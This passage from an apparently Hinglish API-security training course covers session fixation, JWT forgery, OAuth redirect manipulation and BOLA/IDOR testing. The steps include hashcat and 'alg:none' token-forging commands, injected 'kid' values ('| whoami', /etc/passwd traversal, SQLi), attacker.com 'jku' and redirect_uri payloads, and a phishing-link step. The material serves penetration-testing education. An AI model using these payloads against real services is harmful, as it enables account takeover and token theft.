- MFA ko disable kar sakte ho

#### 💻 Hands-On Step-by-Step
**Attack 1: MFA Not Required on APIs**
1. Login with MFA, capture session token.
2. Ab sensitive API call karo (e.g., change password) with same token.
3. Agar server MFA nahi maang raha, to bypass ho gaya.

**Attack 2: MFA Disable via Parameter**
1. Request mein `"mfa_enabled":true` ho sakta hai.
2. Use `false` karo.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**MFA sirf login par hai, baaki APIs par nahi, to MFA ka kya fayda?**

---


### Topic 2.4: 🎯 Title: Session Security – Fixation, Rotation, Concurrency
*Session ID se khelo, account le lo*

#### 🐣 Samjhane ke liye (Analogy)
Socho tum ek party mein jaate ho. Guard tumhe ek slip deta hai jisme number likha hai `123`. Tum andar jao, party karo. Jab wapas aao, guard slip check karta hai aur andar jaane deta hai. Ab agar guard slip ka number change nahi karta, toh koi aur tumhari slip copy kar ke aake bol sakta hai "Mera number bhi `123` hai" aur andar ghus jayega. Yahan **slip = session ID**, **guard = server**.

#### 📖 Technical Definition
Session security ka matlab hai ki server har user ko ek unique session ID deta hai, aur us ID se user ki identity maintain karta hai. Agar ye session ID **predictable**, **static**, ya **poorly managed** ho, toh attacker usse hijack kar ke user ka account le sakta hai.

#### 🧠 Zaroorat Kyun Hai?
Session fixation, session hijacking, concurrent session issues – ye sab flaws se aap bina password ke kisi bhi user ke account mein ghus sakte ho.

#### 🔍 Visual - Screen Par Kya Dikhega
Burp Suite mein:
- Login se pehle: `Cookie: PHPSESSID=abc123`
- Login ke baad: `Cookie: PHPSESSID=abc123` (same) – **Vulnerable!**
- Login ke baad: `Cookie: PHPSESSID=xyz789` (changed) – **Secure**.

#### ⚙️ Under the Hood
- **Session Fixation:** Attacker pehle user ko ek session ID de deta hai (jaise email mein link bhej kar). User login karta hai to server usi session ID ko authenticated mark kar deta hai. Ab attacker ke paas bhi wahi session ID hai, to wo user banke ghoom sakta hai.
- **Refresh Token Rotation:** OAuth 2.0 mein refresh token long-lived hota hai, access token short-lived. Jab access token expire ho, to refresh token se naya access token lete hain. Agar refresh token rotate nahi hota (purana wahi rehta hai), to attacker chura kar hamesha access le sakta hai.
- **Concurrent Sessions:** Kitne devices par ek user login ho sakta hai? Isse brute-force attacks mein madad milti hai.

#### 💻 Hands-On Step-by-Step (Reference: Page 19)
**Attack 1: Session Fixation**
1. Target site par bina login kiye request bhejo (e.g., homepage).
2. Response mein cookie note karo: `Set-Cookie: PHPSESSID=abc123`
3. Ab ek phishing email bhejo user ko jisme ye link ho: `https://target.com/login?PHPSESSID=abc123`
4. User login karta hai to server isi session ID ko authenticate kar dega.
5. Ab tum wahi session ID use karo: `Cookie: PHPSESSID=abc123`
6. Request bhejo – tum user banke logged-in ho!

**Attack 2: Check Session ID Static Hai Kya?** (Reference: Page 19)
1. Burp mein login se pehle kisi bhi request ka cookie capture karo.
2. Login request karo aur successful login ke baad ki cookie dekho.
3. Compare karo:
   - Same hai → **Session Fixation Vulnerability**
   - Different hai → Secure

**Attack 3: Refresh Token Rotation Test**
1. Login karo, refresh token capture karo (usually in response body).
2. Jab access token expire ho, refresh token use kar ke naya access token lo.
3. Response mein naya refresh token aaya ya purana?
   - Naya aaya → Rotation implement hai (secure)
   - Purana wahi aaya → Rotation nahi hai (vulnerable)
4. Ab purana refresh token dobara use karo. Agar accept ho jata hai, to **refresh token replay** possible hai.

**Attack 4: Concurrent Sessions Test**
1. Ek browser (Chrome) se login karo.
2. Doosra browser (Firefox) se same credentials se login karo.
3. Chrome se logout karo.
4. Firefox check karo – logout hua ya nahi?
   - Dono sessions active hain → Concurrent sessions allowed.
   - Kitne max? Try 10 browsers se login. Limit check karo.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Session ID same mili, refresh token rotate nahi ho raha, unlimited concurrent sessions.
- **Failure:** Session ID change ho gayi, refresh token rotate ho raha, concurrent sessions limited.

#### ⚖️ Comparison (X vs Y)
| Feature | Secure Implementation | Vulnerable Implementation |
|---------|----------------------|--------------------------|
| Session ID | Login ke baad change | Login ke baad same |
| Refresh Token | Har use par rotate | Static, reuse possible |
| Concurrent Sessions | Limited (1-5) | Unlimited |

#### 🚫 Common Mistakes
- Sirf login form test karna, session fixation ke liye pre-login cookies ignore karna.
- Refresh token ko bhi access token ki tarah treat karna – dono alag hote hain.
- Concurrent sessions test karte waqt rate limit bhoolna.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Session fixation ke liye user ko link kaise bhejein?"** – Bug bounty mein aap PoC bana kar dikha sakte ho ki agar user ye link click kare to kya hoga. Direct user ko bhejna illegal hai.
- **"Refresh token rotation test mein kaise pata chale ki naya token aaya?"** – Response body dekho, usually `refresh_token` field mein naya token aata hai.

#### 🌍 Real-World Use Case
Facebook pe ek time pe session fixation tha. Attacker ne user ko ek link bheja jisme session ID set thi. User login kiya to attacker us session ID se account access kar sakta tha.

#### 🎨 Visual Diagram (Session Fixation)
```
[Attacker] -> Generates session ID (SID=123)
[Attacker] -> Sends link to user: https://target.com/?SID=123
[User] -> Clicks link, logs in
[Server] -> Associates SID=123 with user's account
[Attacker] -> Uses SID=123 -> Logged in as user!
```

#### 🛠️ Best Practices (Pro Tips)
- **Burp Extension:** "Session Fixation Scanner" use karo.
- Refresh token rotation test ke liye **AutoRepeater** extension use karo to automatically replay old tokens.
- Concurrent sessions test ke liye different browsers ya incognito windows use karo.

#### ❓ FAQ
1. **Q: Session fixation ka OWASP Top 10 mein kya number hai?**  
   A: OWASP API Top 10 mein specifically nahi, lekin "Broken Authentication" ka part hai.
2. **Q: Refresh token reuse se kya ho sakta hai?**  
   A: Attacker ek baar token chura kar hamesha naye access tokens le sakta hai, kabhi logout nahi hona.
3. **Q: Concurrent sessions ka kitna limit safe hai?**  
   A: Usually 3-5 sessions allowed hote hain, isse zyada suspicious hai.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**Session ID login pe change ho, refresh token rotate ho, aur concurrent sessions limited ho.**

---

### Topic 2.5: 🎯 Title: JWT (JSON Web Tokens) Deep-Dive
*Token ka khel, admin ban ne ka spell*

#### 🐣 Samjhane ke liye (Analogy)
JWT ek **magic pass** ki tarah hai jo tumhe har jagah entry deta hai. Iss pass par likha hota hai "User: Normal", aur neeche ek **chhapa (signature)** hota hai jo sirf king ke paas hai. Agar tum pass par "User: Admin" likh kar signature nahi bana sakte, to guard pakad lega. Lekin agar guard signature check karna bhool jaye, ya tum koi aisa trick use karo ki signature valid lagne lage, to tum admin ban sakte ho.

#### 📖 Technical Definition
JWT (JSON Web Token) ek stateless authentication mechanism hai. Ye teen parts mein banta hai: `header.payload.signature`. Sab kuch base64 encoded hota hai. Server token ko verify karta hai signature se, aur agar valid hai to payload par bharosa karta hai.

#### 🧠 Zaroorat Kyun Hai?
JWT attacks se aap:
- **Privilege Escalation** kar sakte ho (user to admin)
- **Account Takeover** kar sakte ho (kisi aur ka token bana lo)
- **Information Disclosure** kar sakte ho (payload mein sensitive data ho to)

#### 🔍 Visual - Screen Par Kya Dikhega
JWT kuch aisa dikhta hai:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.4x1jU8JkL9KxJkL9KxJkL9K
```
- **Part 1 (Header):** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` → Decode: `{"alg":"HS256","typ":"JWT"}`
- **Part 2 (Payload):** `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9` → Decode: `{"user":"admin","role":"user"}`
- **Part 3 (Signature):** `4x1jU8JkL9KxJkL9KxJkL9K` → HMAC-SHA256(secret, header.payload)

#### ⚙️ Under the Hood
JWT verification:
1. Header aur payload ka base64 decode karo.
2. Header se `alg` parameter dekho.
3. Agar `alg: HS256`, to secret se signature verify karo.
4. Agar `alg: RS256`, to public key se signature verify karo.
5. Agar `alg: none`, to signature check mat karo (vulnerable!).

#### 💻 Hands-On Step-by-Step

##### Sub-Topic 2.5.1: JWT Structure & Decoding (Reference: Page 7)

**Step-by-Step:**
1. Kisi bhi request se JWT token copy karo (usually `Authorization: Bearer <token>` header mein).
2. `jwt.io` website kholo.
3. Token paste karo – decoded header aur payload dikh jayega.
4. Header mein dekho `alg` kya hai (HS256, RS256, none).
5. Payload mein dekho kaunsa data hai (`user`, `role`, `exp`, `jti`, etc.).
6. **Note:** Signature verify karne ke liye secret/pubic key chahiye, jo humein nahi pata.

##### Sub-Topic 2.5.2: Hashcat – Brute-force HS256 Secret (Reference: Page 8-9)

**Scenario:** Server HS256 use kar raha hai, aur secret key weak hai (e.g., `secret`, `password`, `123456`). Hum token ka signature crack kar ke secret nikal sakte hain.

**Step-by-Step:**
1. Token capture karo, e.g.:
   ```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.4x1jU8JkL9KxJkL9KxJkL9K
   ```
2. Is token ko ek file mein save karo: `token.txt`
3. Hashcat command:
   ```bash
   hashcat -m 16500 token.txt /path/to/wordlist.txt --show
   ```
   - `-m 16500` = JWT HS256 (HS384 ke liye `16510`, HS512 ke liye `16520`)
   - Wordlist mein common secrets daalo (e.g., `rockyou.txt`)
4. Agar secret crack ho gaya, to output kuch aisa hoga:
   ```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.4x1jU8JkL9KxJkL9KxJkL9K:secret123
   ```
   Means secret = `secret123`
5. Ab is secret se apna khud ka token bana sakte ho.

##### Sub-Topic 2.5.3: None Algorithm Attack

**Scenario:** Purani JWT libraries mein `alg: none` ko support karti thi, jisme signature verify nahi hota tha.

**Step-by-Step:**
1. Original token ka header base64 decode karo:
   ```
   echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
   {"alg":"HS256","typ":"JWT"}
   ```
2. Modify karo `alg` ko `none`:
   ```
   {"alg":"none","typ":"JWT"}
   ```
3. Base64 encode karo (URL-safe):
   ```
   echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '/+' '_-' | tr -d '='
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
   ```
4. Payload modify karo, e.g., `{"user":"admin","role":"admin"}`
   ```
   echo -n '{"user":"admin","role":"admin"}' | base64 | tr '/+' '_-' | tr -d '='
   eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ
   ```
5. Signature part hata do (empty rakho). Token ban gaya:
   ```
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
   ```
6. Request mein token replace karo. Agar server `alg:none` accept karta hai to admin access mil jayega.

##### Sub-Topic 2.5.4: Algorithm Confusion (RS256 -> HS256)

**Scenario:** Server RS256 (asymmetric) use kar raha hai, aur public key publicly available hai (e.g., `/jwks.json`). Hum public key ko HS256 symmetric key ki tarah use karte hain.

**Step-by-Step:**
1. Public key dhundho:
   - Try `/.well-known/jwks.json`
   - Try `/jwks.json`
   - Try `/.well-known/openid-configuration` (jo jwks_uri batayega)
2. Public key save karo `public.key` file mein.
3. JWT token capture karo.
4. `jwt_tool` use karo:
   ```bash
   python jwt_tool.py <token> -X a -pk public.key
   ```
   - `-X a` = Algorithm confusion attack
5. Ye tool naya token banayega with `alg: HS256` aur public key se sign karega.
6. Request mein naya token bhejo. Agar server public key se verify karta hai (jo ab secret ban gaya), to accept ho jayega.

**Manual Method:**
1. Header change karo: `{"alg":"HS256","typ":"JWT"}`
2. Payload modify karo.
3. Public key ko secret maan kar HMAC-SHA256 sign karo.
   - Python mein:
     ```python
     import jwt
     with open('public.key', 'r') as f:
         public_key = f.read()
     token = jwt.encode({'user':'admin'}, public_key, algorithm='HS256')
     print(token)
     ```

##### Sub-Topic 2.5.5: `kid` (Key ID) Injection

**Scenario:** Header mein `kid` parameter hota hai jo server ko batata hai ki kaunsi key use karni hai verify karne ke liye. Agar server is `kid` ko bina validate kiye file system ya database se read karta hai, to hum path traversal ya SQLi kar sakte hain.

**Step-by-Step:**
1. Original token ka header dekho:
   ```json
   {
     "alg": "HS256",
     "typ": "JWT",
     "kid": "key1"
   }
   ```
2. `kid` ko modify karo:
   - **Path Traversal:** `"kid": "../../../../dev/null"` (null key use karega)
   - **Path Traversal:** `"kid": "../../../../etc/passwd"` (LFI try)
   - **Command Injection:** `"kid": "| whoami"`
   - **SQLi:** `"kid": "key' UNION SELECT 'secret'"`
3. Agar server `kid` ko file path samajh kar read karta hai, to:
   - `../../../../dev/null` ka matlab empty string, to signature verification fail ho sakta hai ya empty key use ho sakti hai.
   - Agar `/etc/passwd` read ho jata hai, to uske content se key bana sakte ho.
4. Naya token banao with modified `kid` aur sign karo (agar secret pata ho to).
5. Bhej kar dekho.

##### Sub-Topic 2.5.6: `jku` / `x5u` Header Injection

**Scenario:** `jku` (JWK Set URL) header mein server JWKS file ka URL deta hai jahan se public key leni hai. Agar server bina validate kiye is URL se key uthata hai, to hum apna khud ka JWKS server bana sakte hain.

**Step-by-Step:**
1. Apna khud ka JWKS server banao (ya online tool use karo).
2. Apne private-public key pair banao.
3. JWKS endpoint par apni public key serve karo.
4. Original token ka header modify karo:
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "https://attacker.com/jwks.json"
   }
   ```
5. Payload modify karo, aur apne private key se sign karo.
6. Token bhejo. Server `jku` se public key uthayega aur verify karega – jo ki valid hoga!

##### Sub-Topic 2.5.7: JTI (JWT ID) Replay Attack

**Scenario:** `jti` claim unique ID hota hai token ka. Agar server check nahi karta ki ye ID already use ho chuki hai, to same token baar-baar use kar sakte ho.

**Step-by-Step:**
1. Koi sensitive action ka token capture karo (e.g., password change).
2. Use token repeat karo multiple times.
3. Agar har baar action successful ho, to replay vulnerability hai.

##### Sub-Topic 2.5.8: Timing Attacks

**Scenario:** Valid aur invalid signature verify karne mein server different time le raha hai. Isse brute-force fast ho sakta hai.

**Step-by-Step:**
1. Burp Suite ya Python script se time measure karo.
2. Multiple requests bhejo with slightly different signatures.
3. Agar response time mein consistent difference ho, to timing attack possible hai.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Token modify kar ke admin access mil gaya, ya kisi aur user ka data mila.
- **Failure:** Server "Invalid signature" error deta hai, ya 401 Unauthorized.

#### ⚖️ Comparison (X vs Y)
| Attack | Difficulty | Impact | Fix |
|--------|------------|--------|-----|
| None Algorithm | Easy | Critical | Disable `alg:none` |
| Algorithm Confusion | Medium | Critical | Validate algorithm, use separate keys |
| `kid` Injection | Medium | High | Validate `kid` input |
| `jku` Injection | Hard | Critical | Whitelist JWKS URLs |
| JTI Replay | Easy | Medium | Store used JTIs |
| Hashcat | Easy | Critical | Use strong secrets |

#### 🚫 Common Mistakes
- Sirf HS256 tokens par focus karna, RS256 ignore karna.
- `kid` injection mein path traversal ke alawa SQLi bhi ho sakti hai, ignore karna.
- JTI replay ke liye `exp` (expiry) check karna, lekin `jti` check na karna.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Public key kaise milegi?"** – Often `/jwks.json`, `/.well-known/jwks.json`, ya response headers mein. Kuch APIs metadata endpoint bhi dete hain.
- **"None algorithm kaise try karun?"** – Header base64 decode karo, modify karo, fir base64 encode karo aur signature part khali rakho. Ya tool use karo.
- **"`kid` injection mein SQLi kaise kaam karega?"** – Agar server `kid` ko database query mein use karta hai jaise `SELECT key FROM keys WHERE kid='key1'`, to SQLi daal kar secret nikal sakte ho.

#### 🌍 Real-World Use Case
- **Paytm:** `kid` parameter SQL injection vulnerable tha. Attacker `kid` mein SQLi daal kar secret nikal sakta tha.
- **Microsoft:** Algorithm confusion vulnerability thi jisme public key se HS256 sign kar sakte the.
- **Apple:** `jku` injection se attacker apna JWKS server laga kar token bana sakta tha.

#### 🎨 Visual Diagram (JWT Structure)
```
JWT Token:
[Header] . [Payload] . [Signature]
    |           |            |
    v           v            v
{"alg":"HS256"} {"user":"admin"} HMAC-SHA256(secret, header.payload)
```

#### 🛠️ Best Practices (Pro Tips)
- **jwt_tool** install karo: `git clone https://github.com/ticarpi/jwt_tool`
- **Burp Extension:** "JSON Web Tokens" extension use karo jo automatically decode karega aur attacks suggest karega.
- Manual tampering ke liye `jwt.io` website use kar sakte ho, lekin signature verify nahi hoga.
- Hashcat ke liye `-m 16500` yaad rakho.
- Algorithm confusion ke liye public key mile to turant try karo.

#### ❓ FAQ
1. **Q: JWT secret kaise pata karein?**  
   A: Weak secret hai to crack karo `hashcat` se. Common wordlist use karo (`rockyou.txt`). Agar secret strong hai to nahi milega.
2. **Q: JWKS kya hai?**  
   A: JSON Web Key Set – server ke public keys ka set. Multiple keys ho sakti hain, `kid` se identify hoti hain.
3. **Q: Kya JWT hamesha vulnerable hota hai?**  
   A: Nahi, proper implementation secure hai. Lekin implementation flaws common hain.
4. **Q: JWT mein signature verify kaise hota hai?**  
   A: Server header ke `alg` ke according signature verify karta hai. HS256 mein secret se, RS256 mein public key se.
5. **Q: JWT replay se kaise bachein?**  
   A: `jti` claim use karo aur expire kar do, ya short expiry (`exp`) rakho.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**JWT ka header aur payload kholo, algorithm badlo, signature hatao, `kid` mein traversal daalo, aur admin ban jao.**

---

### Topic 2.6: 🎯 Title: OAuth 2.0 / OIDC Flows
*Dusre ke account se login karo*

*(Is topic ko hum pehle hi cover kar chuke hain as Topic 2.5 in previous response. Yahan sirf missing points add kar rahe hain.)*

#### Additional Points from Raw Notes:

**Redirect URI Manipulation (Detailed):**
1. OAuth flow start karo "Login with Google".
2. Authorize request capture karo:
   ```
   GET /authorize?client_id=123&redirect_uri=https://client.com/callback&response_type=code
   ```
3. `redirect_uri` modify karo:
   - Try `https://attacker.com/callback`
   - Try `https://client.com/callback.attacker.com` (if suffix check)
   - Try `https://client.com/callback@attacker.com`
   - Try `https://client.com/callback/../attacker.com`
4. Agar server allowed redirect URIs ko properly validate nahi karta, to authorization code attacker ke server par aa jayega.
5. Attacker ye code use kar ke token le sakta hai.

**State Parameter Missing (CSRF):**
1. OAuth request mein `state` parameter dekho.
2. Agar missing hai ya predictable hai (e.g., `state=123`), to CSRF possible hai.
3. Attacker apni site par ek form bana sakta hai jo user ke browser se OAuth flow start kare.
4. User jab us form par click kare, to uske account ko attacker ke account se link kar de.

**Token Leakage via Referer:**
1. Jab Google redirect karta hai client callback par, URL mein `#access_token=` ya `?code=` hota hai.
2. Client callback page mein agar koi external resource load ho raha hai (image, script, font), to `Referer` header mein ye URL leak ho sakta hai.
3. Attacker apni site par aisi resource rakhe jo log collect kare.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**OAuth ka redirect_URI kholo, state parameter check karo, aur referer se token leak dhundho.**

---

## 🔥 Module 2 Complete Summary: Authentication Attacks Checklist

| Topic | What to Check | Impact |
|-------|---------------|--------|
| Response Manipulation | 403 to 200, body flags | Login bypass |
| No-Rate Limit | OTP brute-force, inbox bombing | Account takeover |
| Clickjacking | X-Frame-Options missing | Session riding |
| Session Fixation | Login pe session ID change? | Account hijack |
| Refresh Token Rotation | Old token reuse? | Persistent access |
| Concurrent Sessions | Unlimited sessions? | Easy brute-force |
| JWT None Algorithm | `alg:none` accept? | Admin access |
| JWT Algorithm Confusion | RS256 to HS256 | Token forgery |
| JWT `kid` Injection | Path traversal, SQLi | Secret leak |
| JWT `jku` Injection | External JWKS | Token forgery |
| JWT JTI Replay | Same token reuse | Action replay |
| OAuth Redirect URI | Manipulation possible? | Code hijack |
| OAuth State Missing | CSRF | Account linking |
| OAuth Token Leakage | Referer header | Token theft |

========================================================================================

## 🔑 Module 3: Authorization (BOLA, BPLA, BFLA)
*Andar aane ke baad, kya kya kar sakte ho?*

---

### Topic 3.1: BOLA / IDOR (Broken Object Level Authorization)

---

#### 1. 🎯 Title
**Broken Object Level Authorization (BOLA) / IDOR**

#### 2. 🐣 Samjhane ke liye (Analogy)
Maan lo ek school mein har student ke paas ek **locker** hai jisme wo apni books aur copy rakhta hai. Locker par ek **number** likha hai (e.g., locker 123). Jab kisi student ko apna locker kholna hota hai, wo guard ko apna **ID card** (authentication token) aur locker number batata hai. Guard sirf ye check karta hai ki **ID card valid hai ya nahi** (authentication), lekin ye nahi check karta ki **ye locker is student ka hai ya nahi** (authorization). Ab ek student, Aman (locker 123), apne dost ke locker 456 ko kholne ki koshish karta hai. Guard dekhta hai ID card valid hai, to locker khol deta hai – bina ye dekhe ki Aman ka locker 456 se koi lena-dena nahi. Yahi BOLA vulnerability hai.

#### 3. 📖 Technical Definition
BOLA (ya IDOR) tab hota hai jab API kisi **object** (jaise user, file, order, etc.) ko access karne ke liye client se ek **identifier** (ID, number, UUID) leta hai, par server **authorization check** karna bhool jata hai. Matlab, server sirf authentication check karta hai – “kya aap valid user ho?” – lekin ye verify nahi karta ki **current authenticated user ko is specific object ko access karne ka permission hai ya nahi**. Iski vajah se ek user doosre user ke data ko dekh, badal, ya delete kar sakta hai.

#### 4. 🧠 Zaroorat Kyun Hai?
Ye vulnerability OWASP API Security Top 10 mein **#1** position par hai, kyunki iska **impact bahut high** hota hai – attackers seedha doosron ka private data chura sakte hain (PII, financial details, medical records), ya unke resources ko modify/delete kar sakte hain. Bug bounty programs mein sabse zyada reports BOLA/IDOR ki hoti hain aur inka bounty bhi highest hota hai.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
Burp Suite ya kisi bhi proxy tool mein jab aap kisi API request ko intercept karte ho, toh kuch aisa dikhega:

**Request:**
```
GET /api/v1/users/123 HTTP/1.1
Host: target.com
Authorization: Bearer <attacker_token>
```
Yahan `123` object ID hai. Isko badalkar `456` karte ho:
```
GET /api/v1/users/456 HTTP/1.1
...
```
Agar response mein user 456 ka data aata hai (jaise name, email, etc.), to ye **success** hai – BOLA mil gaya. Agar error aata hai (403, 401, 404) to failure.

#### 6. ⚙️ Under the Hood
Server ka backend code kuch is tarah ho sakta hai (dummy example):
```python
@app.route('/api/users/<user_id>')
def get_user(user_id):
    # Sirf authentication check
    if not is_authenticated(request.headers['Authorization']):
        return {"error": "Unauthorized"}, 401

    # Database se user fetch karo
    user = db.query("SELECT * FROM users WHERE id = ?", user_id)
    return user, 200
```
Yahan `is_authenticated` to check ho raha hai, lekin ye nahi dekha gaya ki currently logged-in user ka ID `user_id` ke barabar hai ya nahi. Isliye koi bhi authenticated user kisi bhi user ka data le sakta hai.

#### 7. 💻 Hands-On Step-by-Step
1. **Login** karo ek normal user account se (e.g., user A).
2. **Intercept** karo koi bhi request jisme object ID ho – jaise profile view, order details, file download. Common patterns:
   - `GET /api/profile?id=123`
   - `GET /api/orders/ORD-456`
   - `DELETE /api/posts/789`
3. Request ko **Burp Repeater** mein bhejo (right click → Send to Repeater).
4. ID ko modify karo:
   - Numeric IDs: `123` → `124`, `125`, `0`, `-1` (negative IDs se error messages mein DB info leak ho sakta hai).
   - UUIDs: Agar IDs `user-abc123` jaisi predictable nahi hain, to unhe kisi aur jagah se leak karne ki koshish karo (JS files, referrer header, other API responses). Fuzzing ke liye Burp Intruder mein payload set karo.
   - Strings: Agar IDs `ORD-2025-001` jaisi hain, to pattern guess karo.
5. Request forward karo aur response dekho. Agar doosre user ka data mil raha hai, to BOLA hai.
6. **Bulk BOLA**: Agar API multiple IDs ek saath accept karti ho (jaise POST request mein JSON array), to try karo:
   ```json
   POST /api/users/batch
   {
     "ids": [123,124,125]
   }
   ```
   Agar saare users ka data dump mil gaya, to wo massive BOLA hai.
7. **Chained BOLA**: Pehle kisi IDOR se doosre user ki ID leak karo (e.g., kisi public profile se), fir us ID se private data access karo.
8. **Non-CRUD operations**: Sirf GET/POST nahi, balki `DELETE /api/user/123`, `PUT /api/user/123/password` jaise endpoints par bhi try karo.
9. **API versioning**: Agar `/v2/user/me` secure hai, to `/v1/user/123` try karo (version downgrade attack).
10. **Password Reset**: Reset link mein `user_id` ya `email` parameter change karke kisi aur ka password reset karne ki koshish karo.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
| **Situation** | **Response** |
|---------------|--------------|
| **Success** (BOLA present) | `200 OK` ke saath JSON mein victim ka data. Jaise: `{"id":456,"name":"Victim","email":"victim@example.com"}` |
| **Failure** (BOLA not present / patched) | `403 Forbidden` / `401 Unauthorized` / `404 Not Found` (agar ID exist nahi karti) ya phir `200 OK` but same user ka data aaye (current user ka hi data aaye, kyunki server ne enforce kiya ki current user hi access kar sakta hai) |

#### 9. ⚖️ Comparison (IDOR vs BOLA)
| **IDOR (Insecure Direct Object Reference)** | **BOLA (Broken Object Level Authorization)** |
|----------------------------------------------|-----------------------------------------------|
| Old term, mostly used in web apps. | Modern term, OWASP API Security Top 10 mein use hota hai. |
| Focuses on direct reference to object (like file path, DB key). | Focuses on missing authorization check at object level. |
| Basically same vulnerability. | Basically same vulnerability. |

#### 10. 🚫 Common Mistakes
- Sirf numeric IDs try karna, UUIDs ko ignore karna (par UUIDs bhi leak ho sakte hain).
- Sirf GET requests par focus karna; DELETE, PUT, POST ko bhool jana.
- Positive IDs par atakna; negative IDs na try karna (negative IDs se SQL injection ya error leaks mil sakte hain).
- Error messages ignore karna – jaise "User not found for ID 456" se confirm ho jata hai ki 456 exist karta hai, jisse brute force mein madad milti hai.
- Automated tools par depend rehna; manual fuzzing nahi karna.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Mere API mein UUID use ho raha hai, to safe hoon na?"**
  Nahi, UUID sirf guess karna mushkil banata hai, lekin agar authorization check missing hai to vulnerability abhi bhi maujood hai. Agar UUIDs kisi aur jagah leak ho rahe hain (JS files, other API responses, referrer header), to attacker unhe collect kar sakta hai aur access kar sakta hai.
- **"Mere paas /me endpoint hai, to sab safe hai?"**
  `/me` usually current user ki details deta hai, lekin doosre endpoints ho sakte hain jaise `/user?id=` jahan check missing ho. Isliye sab endpoints test karo.
- **"Agar IDOR mil gaya to kya wo humesha critical hota hai?"**
  Impact par depend karta hai. Agar kisi user ka public data mil raha hai (jo anyway public hai), to severity low ho sakti hai. Lekin agar private data (email, phone, address) ya sensitive actions (delete, update) ho rahe hain, to critical hai.

#### 12. 🌍 Real-World Use Case
Ek bug bounty hunter ne Facebook mein GraphQL API ke through IDOR paya. Usne ek request mein `user_id` parameter change kiya aur doosre user ki private photos dekh li. Facebook ne usko $10,000+ ka bounty diya. Is tarah ke BOLA bugs aaj bhi regularly report hote hain.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
[Attacker] --> GET /api/user/456 (with attacker's session token)
   |
   v
[Server] --> Token verify? OK (attacker is user 123)
   |
   v
[Database] --> SELECT * FROM users WHERE id = 456;  (No check: user 123 can access 456?)
   |
   v
[Server] --> Returns data of user 456
   |
   v
[Attacker] gets Victim's private data
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Burp Intruder** ka use karo: payload positions set karo aur numbers, common patterns, UUID lists daalo.
- **Param Miner** extension se hidden parameters dhoondo.
- **Always test with two different accounts**: Ek low-privilege user se doosre user ke resources access karne ki koshish karo.
- **Check HTTP methods** – `GET`, `POST`, `PUT`, `DELETE` sab try karo.
- **API versioning** – `/v1`, `/v2`, `/v3` sab check karo.
- **Error messages analyse karo** – kahi ID exist karti hai ya nahi, iska clue milta hai.
- **Automated scanners** ki blind trust mat karo; manual testing essential hai.

#### 15. ❓ FAQ (Interview Q&A)
1. **Q:** BOLA aur IDOR mein kya antar hai?
   **A:** Dono same vulnerability hai. IDOR purana term hai, BOLA modern OWASP API Top 10 ka term hai jo authorization check missing par focus karta hai.
2. **Q:** Agar UUID use kar rahe hain, to kya BOLA possible hai?
   **A:** Haan, possible hai. UUID sirf enumeration mushkil banata hai, lekin agar authorization check missing hai to vulnerable hai. Agar UUID leak ho jaye (jaise kisi response mein), to attacker access kar sakta hai.
3. **Q:** BOLA sirf GET requests mein hota hai?
   **A:** Nahi, kisi bhi method (POST, PUT, DELETE) mein ho sakta hai. Jaise `DELETE /api/post/123` se kisi aur ka post delete karna.
4. **Q:** Bulk BOLA kya hai?
   **A:** Jab API ek saath multiple objects ki IDs accept karti hai (jaise array) aur server bina authorization check ke saare ka data return kar deta hai.
5. **Q:** BOLA ko kaise prevent karein?
   **A:** Har object access request mein check karo ki current user ke paas us object par access ka permission hai ya nahi. Jaise `if current_user.id == requested_user_id` ya role-based permissions.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"BOLA matlab server ne sirf token check kiya, par ye nahi dekha ki token wala banda is ID ka malik hai ya nahi."**

---

### Topic 3.2: BPLA / Mass Assignment (Broken Property Level Authorization)

---

#### 1. 🎯 Title
**Broken Property Level Authorization (BPLA) / Mass Assignment**

#### 2. 🐣 Samjhane ke liye (Analogy)
Maano tum ek online form bhar rahe ho koi naya account banane ke liye. Form mein sirf **naam** aur **email** ke fields hain. Tum form bhar kar submit kar dete ho. Par peeche server pe jo code hai, wo tumhare bheje gaye saare data ko seedha database mein daal deta hai bina check kiye ki tumhe konsi fields bharne ki permission thi. Ab tum socho, form mein to sirf do fields the, lekin agar tum ek extra field bhej do, jaise `"isAdmin": true`, to server maan lega ki tum admin ban gaya. Isi tarah, **Mass Assignment** vulnerability mein attacker extra properties bhej kar un fields ko modify kar sakta hai jinhe modify karne ka uske paas authority nahi hai.

#### 3. 📖 Technical Definition
BPLA (ya Mass Assignment) tab hota hai jab API server client se aaye hue data ko **directly** internal objects (jaise database models) mein bind kar leta hai, bina **allowlist** ke ki kaunse properties ko update karne ki anumati hai. Iski vajah se attacker hidden ya sensitive fields (jaise `isAdmin`, `balance`, `role`) ko request mein bhej kar unki value badal sakta hai.
